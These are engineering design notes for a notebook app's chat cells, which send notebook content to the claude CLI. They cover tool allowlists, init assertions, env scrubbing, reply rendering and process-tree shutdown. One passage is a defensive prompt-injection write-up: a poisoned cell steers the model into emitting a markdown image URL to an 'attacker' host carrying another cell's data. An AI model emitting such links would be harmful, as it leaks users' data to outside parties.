# Chat cells and custom instructions

Design notes and decision records. Each entry states a decision and the reason for it. The code shows what it does; this file says why it is shaped that way. When an entry says "see the X entry", X is a bold entry title, and it may sit in another file in this folder. The short list of rules every change must follow lives in `AGENTS.md`.

- **Chat cells (`metadata.cellar.language='chat'` + `src/lib/server/chat/`) - ask Claude ABOUT the notebook, from a cell.** The FIFTH logical type, on the SQL mechanism (nbformat `code` + the language tag, so plain Jupyter still opens the file; `languageTagFor` in `cellLanguage.ts` is the ONE logical-type -> tag rule, which replaced four hand-written `'sql'`-or-null ternaries - never re-inline one). Run = send: the transcript is every cell STRICTLY ABOVE (source + deterministic output text, prior chat replies labelled `reply`) minus cells `hidden_from_agent` (through the ONE shared `isHiddenFromAgent` predicate - a disclosure rule, not tidiness), with the chat cell's own source as the question, LAST (`buildChatPrompt` in `transcript.ts`). **The transcript is BYTE-STABLE across unchanged runs on purpose** - it is the CLI's cached prompt prefix (measured 22.6x cheaper in the design report), so no timestamps, no randomness, ANSI stripped, images as fixed placeholders; pinned by a render-twice test + a no-`Date.now()` source guard. **A chat run NEVER touches the kernel** - which the human surface honors too: `LiveNotebook.runCell` skips `onRunStart`/`onRunEnd` for a chat cell (kept PAIRED, so the in-flight count is never stranded), because those are what make the navbar badge assert a live BUSY kernel and optimistically mark one started - a question asked in a notebook that never booted one otherwise read "busy" for the whole reply. `run.ts` branches to `executeChatRun` before `execute()`, `lastRun.session` stays null (`ran_this_session` honestly false - a reply is not a namespace fact), staleness reports `n/a`, **and the agent surface answers in its OWN run_status vocabulary** (`chatRunStatus` at the ONE `runStatus` seam: `ok_chat_reply` / `error_chat_reply` when this process ran it, read off the runtime-only `lastRun` stamp, `chat_reply_persisted` for a saved reply carrying none, `unrun` for neither) - the kernel words all answer "does what this cell defined still exist", so a just-answered reply came out as `ok_persisted`, which INSTRUCTIONS clause 3 defines as a leftover to distrust and RE-RUN, i.e. the label itself steered an agent into a billed nondeterministic turn that overwrites the user's reply. A flag beside a misleading label is a trap, so the LABEL changed; clause 3 carries the matching doctrine (never re-run a chat cell to refresh state) (nondeterministic replies: no re-run "restores" anything), and `dataflow.ts` excludes chat prose from the Python probe (unlike SQL there is no synthetic `defines` - a reply binds nothing). The reply streams over the EXISTING accumulator/delta rail as stream text and is finalized into ONE `display_data {text/markdown, text/plain}` republished at index 0 (the client's stable-index replace snaps the stream to rendered markdown; a mid-run clear truncates through the same registry as any run, so only post-clear text survives). **The finalize runs on EVERY outcome - a failed or cancelled run's partial reply is rendered too, beside its failure `display_data` - and its shape is dictated by the NO-RETRACT invariant** (`run-chat.ts`'s `finalizeChatOutputs`): the wire has no frame that removes an element, so the finalize may only REPLACE an index every client already holds - the result has the input's exact length and differs only at index 0, the one index republished. It therefore demands a single `stdout` stream element at index 0 and refuses anything else; a CAPPED run (its truncation marker is a second stream element) is skipped outright and stays as streamed text. Proven by replaying every published frame into a client mirror and comparing it with the persisted outputs (`tests/unit/chat-run.test.ts`). **`text/markdown` is rendered through the shared sanitizer funnel - NEVER `text/html`, which would make a model reply an XSS surface - and WHICH renderer is decided by the CELL, never by the mime**: a chat cell's payload is the model's authored prose, so it takes `renderChatReply` (math ON), while any OTHER cell's `text/markdown` display_data is KERNEL OUTPUT and takes `renderOutputMarkdown` (math OFF), the same content-class split `renderTable` already makes. **NO `text/markdown` OUTPUT may fetch on render, on ANY surface, and the rule keys on PROVENANCE rather than on the cell's type** (`$lib/markdownNoFetch`'s `noFetchImages` + `markdown.ts`'s `OUTPUT_SANITIZE_CONFIG`, the second declared profile beside the shared one - one funnel, two profiles). It closes the markdown-image exfiltration vector: a reply is generated from a transcript built out of cell SOURCE and stored OUTPUT, which can include content the user never wrote, so a prompt-injecting cell can steer the model into emitting `![](https://attacker/?d=<another cell's data>)` - a zero-click outbound GET fired the instant the cell renders, again on every reload since the reply is persisted, and, in an exported report, **in every READER's browser**, which is the worse of the two leaks. Keyed on the CELL it would not hold: a logical type is MUTABLE (retyping a chat cell to code KEEPS its outputs) and foreign metadata is FORGEABLE, so the only trustworthy fact is that a `text/markdown` output was machine-emitted. So every OUTPUT renderer carries it - `renderChatReply` (prose, math on) and `renderOutputMarkdown` (math off) in the app, plus `export-html.ts`'s own `mdOutput` engine, which cannot share the app's sanitizer (no DOM) and therefore shares the markdown-it RULE instead, with both surfaces pinned against the same unit cases. An `<img>` renders as its alt text (or its URL as plain text), `<a>` stays clickable since a click is deliberate, and `html:false` was never enough on its own - it escapes raw HTML but leaves markdown-it's own image rule emitting a live `<img src>`. **Accepted cost:** a kernel `Markdown()` output referencing a remote image no longer auto-loads it. Deliberately NOT same-origin-only, and deliberately NOT applied to markdown CELLS or any other authored surface - user-authored content is a different trust class and its rendering is byte-unchanged - without that gate `display(Markdown('Revenue: $5 vs $1,200'))` KaTeX-typeset the span between the dollar signs and swallowed the user's own data. `Cell.svelte`'s per-output render memo therefore records the mode it rendered in, since a code->chat conversion KEEPS its outputs. **A chat cell is REFUSED on a `.py` TEXT notebook**, through the SAME `assertCanHoldType` guard (renamed from `assertCanHoldRaw`) at the SAME four doc-layer writers, with the refused types listed ONCE in `cellLanguage.ts` (`PY_UNSUPPORTED_TYPES` = raw, chat) so a SIXTH logical type is decided there rather than shipping into the trap: such a document is rebuilt from its CELLS on every save and carries neither `cellar` metadata nor outputs, so the tag AND the reply would live only in memory - worse than the raw case, since no re-run reproduces a model reply. The error carries its own `cellType`/`reason` (`chat-in-py-notebook`), the three cell routes report it in their existing 400 shape, MCP surfaces it through the same wrapper, and `Cell.svelte`'s type menu drops every refused type when `isPy`; CLEARING and every other conversion stay allowed. **Command-mode `t` converts the selection to chat**, the fourth member of the change-type family beside `m`/`y`/`r` - one registry entry plus `'to-chat': () => setTypeSelection('chat')`, so it inherits the multi-selection semantics, the `.py` refusal and the optimistic apply rather than re-deriving any of them; `t` is the only free letter of "chat" (`c`/`h`/`a` are copy/fold/insert-above) and is unbound in Jupyter's own command mode, so it forecloses no future parity chord. Note `sql` has NO convert shortcut - the family is four of the five logical types, not all of them. **The two CREATE paths ask the guard about the CELL THEY BUILT, not about the type they were asked for** (`assertCanHoldCell`, which is `assertCanHoldType` over `logicalCellType(cell)`): a logical type can be carried by the `cellar` namespace rather than by the argument, and `addCell` SEEDS a caller-supplied namespace whose `DURABLE_CELLAR_KEYS` includes `language` - so `cellType:'code'` plus `cellar:{language:'chat'}` (reachable as `POST /api/cells`) passed the argument guard and still produced a chat cell on a `.py` document, the exact degrade the refusal exists for. Asking the built cell closes it by construction, and a sixth logical type carried the same way inherits the rule instead of needing a check of its own. **The transcript is BOUNDED, and an over-budget notebook is REFUSED rather than sent** (`MAX_CHAT_PROMPT_BYTES`, 600 KB of UTF-8, `CELLAR_CHAT_MAX_PROMPT_BYTES`): output caps let a few heavy cells build a multi-megabyte prompt re-sent on every run, whose only feedback was a silently large bill and then an opaque `api_error`, so `run-chat.ts` refuses BEFORE spawning the engine with a `transcript_too_large` failure naming the size and the two levers (clear outputs, `hidden_from_agent`). Nothing is truncated, sampled or summarized - choosing WHAT to send is a separate feature, and any such policy must keep the byte-stability rule intact. **The init assertion fails closed on a MISSING event too, not only a missing field**: no delta is forwarded before a verified `system/init`, and an otherwise-successful run that never reported one fails `unsafe_init` - an assertion that only runs when the report arrives is no assertion at all. `onLine` also ignores everything parsed after the run SETTLED (a stop settles on the VERDICT rather than on the child's pipes - see **STOP MUST REACH THE TREE** in the engine sub-bullet, which owns that rule - so stdout can still be open and still be written to afterwards), since `run.ts` has already finished and persisted that accumulator. **The finalize is skipped when the accumulator tripped a cap**: the truncation marker is a SECOND output the client already holds and only index 0 is republished, so folding both into one markdown element would orphan it until a reload; a capped reply stays as streamed text beside its marker. The login child's stdin carries the paste-fallback code and therefore takes an `error` listener - an unhandled EPIPE there takes down the whole server process. **Nondeterminism is a stated property**: an identical re-run writes a different reply, i.e. a git diff clean-on-save cannot remove (documented in `cellLanguage.ts`).
  - **The engine is a seam (`chat/engine.ts`), and the ONLY shipped engine is the claude CLI with a FROZEN argv per CAPABILITY SHAPE** (`chatCliArgs()` in `claude-cli.ts`, both shapes pinned byte-for-byte by test): `-p` + `--tools <names>` + slash commands OFF + `--setting-sources ""` + `--strict-mcp-config` + no session persistence + `stream-json`, plus **`--allowedTools <rules>` on the CAPABILITY shapes ONLY**. There are FOUR shapes (search off/on x reads off/on), all four pinned byte-for-byte: `""` (no tools) by default, `WebSearch` when the user opted into search - **search ONLY, deliberately never WebFetch** (search is mediated, arbitrary URL fetching is not) - and `Read,Glob,Grep` when the user opted into workspace reads, **read-only, so never `Write`/`Edit`/`Bash`** (a chat cell learns from the code, it does not edit it or run things in it; the ceiling is pinned BEHAVIOURALLY - every capability shape's `chatToolPolicy(caps).tools` must stay inside `[WEB_SEARCH_TOOL, ...READ_TOOLS]` - never by a source scan for those literals, which a rename or a computed name walks straight past). **`--tools` REQUESTS a tool; `--allowedTools` GRANTS the call, and BOTH are needed or the opt-in is INERT** - measured against claude 2.1.237: with `--tools WebSearch` alone the session LISTS the tool (so `system/init` reports it and the exact-allowlist assertion below passes) while the call stays permission-gated in non-interactive `-p` mode, so the model calls WebSearch, the CLI answers `Claude requested permissions to use WebSearch, but you haven't granted it yet.`, and the user reads a dead end Cellar offers no way out of (and NOT the `unsafe_init` path any copy explains); the identical argv plus `--allowedTools WebSearch` performs the search and returns cited results. Both flags read the SAME `chatToolPolicy(caps)` the assertion and the frozen prompt read, so the grant can never name a tool the run did not request and then assert, and an EMPTY `--allowedTools` is never passed - **the default shape omits the flag entirely, which is what keeps its argv byte-for-byte the pre-settings one**. No stub can see that gap (it is the CLI's behaviour given the argv, not the argv), so it is pinned against the REAL CLI in `tests/e2e/chat-websearch-grant.spec.ts` at the one observation point that shows it - the `tool_result` the CLI returns for the model's WebSearch call - gated in `beforeAll` (never at module scope, so collecting it spawns nothing) on an installed, signed-in CLI with the reason in the skip. **It lives in e2e rather than unit BECAUSE it bills a real model turn**: the vitest unit suite is what both CI and the no-mistakes gate run and is a deterministic ~6s baseline, so a billed, model-dependent turn there would charge every gate run on any machine with a signed-in CLI - e2e is where a real-turn test belongs: it is absent from that gate, and although it now runs on every PR the runner has no signed-in CLI, so the test SKIPS there with its reason rather than billing anyone (`chat-cell.spec.ts` is the precedent). What stays in the unit suite is the free, deterministic half: the committed `SEARCH_INIT` fixture and the exact-allowlist assertions. The reply TEXT deliberately carries no such assertion: the model may answer from training either way, measured passing with the grant removed. **FIVE of the engine's inputs are person-scoped user settings** (Settings → "Chat cells", the global `~/.cellar/` store beside the account slot, read at run time in `run-chat.ts`): the MODEL (`CHAT_MODEL_KEY`, default `sonnet` = the pre-setting value, so an untouched install behaves identically), the WEB-SEARCH opt-in (`CHAT_WEB_SEARCH_KEY`), the WORKSPACE-READS opt-in (`CHAT_WORKSPACE_READS_KEY`), the OTHER-NOTEBOOKS opt-in (`CHAT_OTHER_NOTEBOOKS_KEY`, which only ever NARROWS the read grant - see the reads bullet below) and **LEARNING MODE** (`CHAT_LEARNING_MODE_KEY`, the teaching opt-in - **the one that is NOT a capability**: it appends `CHAT_LEARNING_MODE_BLOCK` to the frozen system prompt and leaves `--tools`, `--allowedTools`, `--disallowedTools`, the cwd and the init assertion byte-identical, so it can never widen a session; its block is the product owner's wording and is sent VERBATIM, pinned as literal text rather than through the constant, so a reword fails rather than silently re-instructing the model) - all four flags default OFF, only a literal stored `true` counting (`chatWebSearchEnabled` / `chatWorkspaceReadsEnabled` / `chatOtherNotebooksEnabled` / `chatLearningModeEnabled`), so hand-edited junk cannot widen a session. **They are SEPARATE keys with separate toggles and separate handlers, never one "capabilities" flag**: the three capability ones widen the session in different directions (an outbound query channel vs. local file reach), so wanting one must not hand over the other - pinned in both directions by test - while learning mode widens nothing and is separate for the sibling reason, that how a reply is WRITTEN must not arrive as a side effect of asking for a capability. **All five are written through `setUserSettingNow`, NEVER the debounced `setUserSetting`** - the `setUiNow` rule the Databricks runtime toggle and the worktree agent-config toggle already follow, applied to the cross-project store for the same reason: the SERVER re-reads these keys during a LATER user action (a chat cell RUN), so a ~300ms debounce window is one in which the preference is not yet durable - unchecking "Allow web search" and immediately running a cell still spawned the child with `--tools`/`--allowedTools WebSearch`, i.e. the opt-out silently not covering the very next run, the one outcome that toggle exists to prevent. The e2e that pins it is PARAMETERIZED over every one of those flags, because the guarantee is a property of the HANDLER: proving it for search says nothing about reads, and reads is the one whose window leaves the next run holding a FILE grant. The write notifies `onUserSettingsChange` subscribers SYNCHRONOUSLY (`store.setNow` updates the local cache before it touches the network), so a slow or hung PUT cannot leave a long-lived reader on the old value. **No user text reaches argv**: the stored model is constrained to `$lib/chatCell`'s closed `CHAT_MODELS` list by `normalizeChatModel` - applied at the settings read AND again inside `chatCliArgs`, so no caller can route around it - and anything unknown falls back to the default. The system prompt is **COMPOSED FROM PARTS** (`buildChatSystemPrompt`), not written out per combination: shared framing + the ONE capability sentence that is true for this run + whichever answering-style blocks are on. The capability half is still chosen by the SAME policy that builds the argv (`chatSystemPrompt(policy, learningMode)`, so a prompt can never describe a shape the run does not have) - it must be TRUE for what the run holds ("cannot browse" is false beside a search tool, "cannot read files" is false beside `Read`). **Composed rather than enumerated because a second axis DOUBLES an enumeration**: four `reads x search` constants become eight the moment an orthogonal preference like learning mode lands and sixteen after the next, with every capability sentence copied into each, so a correction to one silently misses the others; as parts, an orthogonal block is ONE addition. The four exported shapes (`CHAT_SYSTEM_PROMPT*`) survive as the every-block-OFF compositions and are pinned byte-for-byte as LITERAL expected text - never against the composer, which would be a tautology - so a reworded framing fails rather than quietly changing what every existing install sends. Byte-stability is unchanged: every part is a module-scope LITERAL and the composition is a pure function of (shape, settings), so **no per-run value may enter, the confinement root emphatically included** - it differs per install, would miss the cache every run, and would leak the path into the model's context (pinned by test). Flipping any setting is one deliberate cache miss. **Never the permissions-bypass flag** (a source guard forbids the literal). **The transcript goes on STDIN and stdin is closed** - an argv positional measurably stalls ~3s and puts a warning on stdout that corrupts the JSON stream. **The `system/init` event is ASSERTED at runtime as an EXACT allowlist - never a relaxation** (`initViolation(init, expectedTools)`, with `chatToolPolicy` the ONE source of the argv request, the grant and the assertion so they cannot drift): `tools` must EQUAL the SET that run requested - exactly empty on the default path, byte-for-byte the pre-setting guarantee; exactly `['WebSearch']` on the search path; exactly the read tools on the reads path; their union on the both-on path - where a report carrying any unrequested tool, or missing the requested one, is the same verdict on all four. It is a SET comparison because the CLI reports its OWN order (a `Read,Glob,Grep` request comes back `["Glob","Grep","Read"]`), and it compares bare NAMES because that is what `system/init` reports - the path scope lives in the GRANT, which is exactly why the two are derived together - and `mcp_servers`/`slash_commands` stay asserted empty on EVERY path; a violation KILLS the child and the run fails closed as `unsafe_init` - a CLI update that grew capability back must fail loudly, never run with it. The tool name was PROBED against the installed CLI rather than assumed (claude 2.1.237 with `--tools WebSearch` reports `tools:["WebSearch"]`, exactly the request) and is committed as the `SEARCH_INIT` fixture beside `SAFE_INIT`. The child env is scrubbed of every `ANTHROPIC*`/`CLAUDE*` key (`chat/env.ts` - an inherited `ANTHROPIC_API_KEY`/Bedrock routing would silently bill a different account than the sidebar shows) and gets exactly one thing back: `CLAUDE_CONFIG_DIR` for a Cellar-owned slot, or nothing for the borrowed ambient login. **STOP MUST REACH THE TREE, AND MUST NOT WAIT ON IT.** `child.kill()` signals ONE pid, and the CLI spawns children of its own (a tool subprocess, a shell it ran), so a stopped run left a descendant alive - REPRODUCED past the Stop press, past the run settling, and past Cellar's own Ctrl-C (the launcher SIGTERMs only its direct children). It also held the inherited stdout, so node's `close` never fired and the run settled only on a 5s force-settle timer (MEASURED 5.0s at the API, 5.3s of spinner). Both halves are gone. The child is spawned **`detached`** so it leads its own process GROUP, and `signalRunTree` signals `-pid` - POSIX only, since on Windows `detached` means a new CONSOLE and there are no negative pids, so that platform keeps the single-process kill it always had; the guard is a POSITIVE `pid > 0`, never `!= null`, because `-0 === 0` and `process.kill(0, sig)` signals the CALLER'S OWN group - this app, the launcher, the sidecar and every kernel. And **`kill()` settles on the verdict it ALREADY has** (`cancelled`/`unsafe_init`/`timeout` are each decided before it runs) rather than on the child's pipes, so PROMPTNESS DOES NOT DEPEND ON THE KILL HAVING WORKED - a descendant that ignores SIGTERM holds the pipe for the whole escalation window, and the user asked for the run to end, not for Cellar to win a race with it. That required making `kill()` IDEMPOTENT: settling re-enters `onLine` through the buffered tail, which the unsafe-init path really reaches and which recursed infinitely on the first attempt; the tail is DISCARDED there rather than re-parsed, being a mid-stream fragment rather than a final line. Settling early is safe by construction (`settle()` is idempotent, a later `close` is a no-op) and is why `onLine` must go on dropping everything parsed after the settle. **STATED RESIDUAL, owned at `signalRunTree`:** once node has REAPED the leader the group is no longer signalled at all - the pgid equals that pid and may be recycled, and this repo refuses to kill without a positive match (`pidReapDecision`), a group-kill of a recycled pgid being far worse than a delayed one - so a descendant ignoring SIGTERM past the 3s escalation survives, as does the whole tree of a leader that was reaped BEFORE `kill()` ran (reachable with no stop at all: the CLI exits, a descendant holds stdout so `close` never fires, and the run hangs to the chat timeout). Narrowing that on "our stdio is still open" was REFUSED - an open pipe proves only that some descendant holds a write end, and one that called `setsid()` holds it from outside the group, i.e. exactly when the pgid is recyclable. The leak is pre-existing (the old `child.kill()` reached no descendant either). **`stopChatRunsOnShutdown` (`chat/active.ts`) closes a PRE-EXISTING leak, and the earlier claim that it merely restored a safety net `detached` removed was wrong**: nothing of Cellar's ever group-killed - a take-over reap and `cellar cleanup` both go through `killPid` (`instances.js`), which signals POSITIVE pids one at a time, and the launcher's own cascade `kill`s its DIRECT children - so a chat descendant already survived an ordinary Ctrl-C before any of this (REPRODUCED). The one external group-kill in the tree is `tests/e2e/harness.ts`. What `detached` really costs is the TERMINAL's group, which is why SIGHUP is handled too. So the app aborts every live chat run on SIGTERM/SIGINT, wired additively in `hooks.server.js` (never `process.exit`, which adapter-node owns) and in `parent-watch.ts`, whose orphan self-exit calls `process.exit` directly so no signal handler would fire there; the emitter is injected, the `releaseOnShutdown` convention. **SIGHUP is handled SEPARATELY and OWNS ITS OWN EXIT - do not "harmonise" the three, the asymmetry IS the design.** The app is spawned undetached, so it sits in the terminal's foreground process group and a hard terminal close SIGHUPs it and the launcher and nothing else, while the chat child leads a session of its own - so without a listener the whole `claude` tree is left behind, the same defect wearing a different hat. But adapter-node registers SIGTERM/SIGINT ONLY and the launcher likewise, so on SIGHUP node's DEFAULT action is the only thing that stops the app, and MERELY REGISTERING A LISTENER SUPPRESSES IT (MEASURED: an otherwise identical process with an empty `process.on('SIGHUP')` survives a hang-up that kills it without one) - a handler that aborts and forgets to die leaves a surviving APPLICATION, strictly worse than the leak (`parent-watch`'s orphan self-exit is only a PARTIAL backstop: it needs two 5s-apart dead readings, so ~5s at best, and does not run at all with no launcher pid or a recycled one - MEASURED, that watchdog MASKED a suppress-and-forget-to-die handler completely at a 20s e2e bound, which is why the spec bounds this path at 3s, under that floor). So `hangUp` aborts, removes OUR OWN listener (never `removeAllListeners`, which would drop another module's) and RE-RAISES, so the process dies BY THE SIGNAL with exactly its previous semantics (MEASURED: status 129, and the raise does not return); if a foreign listener is still registered the default stays suppressed and a re-raise SPINS (MEASURED), so that branch exits `HANGUP_EXIT_CODE` explicitly instead, and `exit` is also the backstop for a raise that returns - both branches terminate. SIGHUP is deliberately ABSENT from `hooks.server.js`'s signal-naming log loop for that same reason: a listener there would suppress the very default the re-raise needs. The die half is injected as `HangupExit` (an emitter cannot stand in for it - removing our listener from a fake says nothing about the real process's disposition), so a unit test drives the abort without killing the runner. **The cost of `detached` is closed OUT of process (`src/lib/server/chat-run-registry.js`).** The tree leaves the TERMINAL's group for good while every in-process route that stops it is a HANDLER (`CHAT_SHUTDOWN_SIGNALS`, `CHAT_HANGUP_SIGNAL`, `parent-watch`'s explicit call), so an app that LEAVES WITHOUT RUNNING ONE - an uncaught exception, an OOM kill, a SIGKILL (`killPid` escalates to it after 4s) - orphans the tree into a session nothing signals. So the engine also writes each group to disk right after `spawn` (`recordChatRun`: `~/.cellar/chat-runs/<pgid>-<nonce>.json`, the `instances.js` pattern; `CELLAR_CHAT_RUNS_DIR` redirects it and the vitest config and `bootCellar` both do, since a launch SWEEPS that directory; nothing under `CELLAR_ISOLATED` or on Windows) and drops it when the LEADER exits - never at settle, which a stop reaches before the tree is dead. Every launch sweeps it (after the take-over, whose SIGKILL can orphan a run; deliberately NOT gated on `--new`), and so does every `cellar cleanup` at every scope (after its instance reaps; listed in the plan and `--dry-run`). **A group is signalled only on TWO positive identities, both through `verifyPidIdentity` - never a second identity rule:** the OWNER app (pid + start time) must be provably GONE - provably alive means a live run, never touched by any sweep at any scope, and unverifiable means keep the record and signal nothing - AND the LEADER, whose pid IS the pgid, must be provably the process recorded, because once it is gone the OS may recycle its pid into an unrelated group leader and `kill(-pgid)` would take down that tree. The SIGKILL escalation re-asks the leader question rather than trusting the pre-SIGTERM answer. **Stated residual:** a descendant that OUTLIVES its leader is not reached - no identity of ours is left to match - the same line `signalRunTree` draws in-process; narrow for chat, which holds no shell tool. Two MEASURED mitigations bound how often any of this matters: `killPid` sends SIGTERM FIRST and that listener aborts SYNCHRONOUSLY, so the SIGKILL half only bites an app already wedged for 4s, and an orphaned REAL `claude` finishes its turn and exits rather than running forever - the endless `sleep` is a property of the test STUB. **DO NOT reach for an `uncaughtException` listener instead**: it SUPPRESSES node's default crash-exit exactly as a SIGHUP listener suppresses the default terminate - the same trap one clause up - so it trades a possibly-orphaned chat tree for a possibly-IMMORTAL APPLICATION, a bigger hole than the one it closes, and it still cannot see SIGKILL at all. The join also matters for the resumed reply text, which a blockquote lazily swallows without a blank line, and the separator TOPS UP to one blank line (a delta routinely ends with its own newline). **A separator is only ever emitted after asking the accumulator whether there is anything to join TO** (`OutputAccumulator.isEmpty`, a pure read - `outputs.length === 0` alone is NOT that question, since stream text sits in the private `pending` buffer until the next ~40ms flush): a mid-run clear-all reaches an in-flight chat cell through `truncateActiveRunOutputs` and resets the accumulator out from under the run, and the run-local join bookkeeping would otherwise open the FRESH buffer with a bare `\` line, or with `gap()`'s blank lines, and persist that stray join. **Every call is shown, none summarised away** - a harness shows every call, the paths ARE the provenance a chatty run most needs, merging keeps a burst to one dim block, and a tall output is already contracted by the scrollable-outputs rule. **`sawDelta` must keep meaning the reply TEXT streamed** - a tool line satisfying it would drop the whole reply of a CLI build that streams no text deltas. Tool reports are held to the SAME gate as a delta: nothing from an unverified or condemned session, since a tool line is a claim about what the run did. **KNOWN, ACCEPTED:** an unterminated ``` fence in the reply swallows the following line in the finalized render - a reply already broken by its own fence, unreachable without one (a tool call ends the assistant turn), and the line is still plainly visible while the run streams. **A FAILED or CANCELLED run renders its lines too** - the finalize runs on every outcome (see the finalize rule in the chat-cells entry), so the `>`, the backticks, the `\` hard break and `*(failed)*`/`*(no result)*` are raw only in the transient live view. Cellar's `.py` notebook formats carry no outputs, so neither the reply nor its lines reach them.
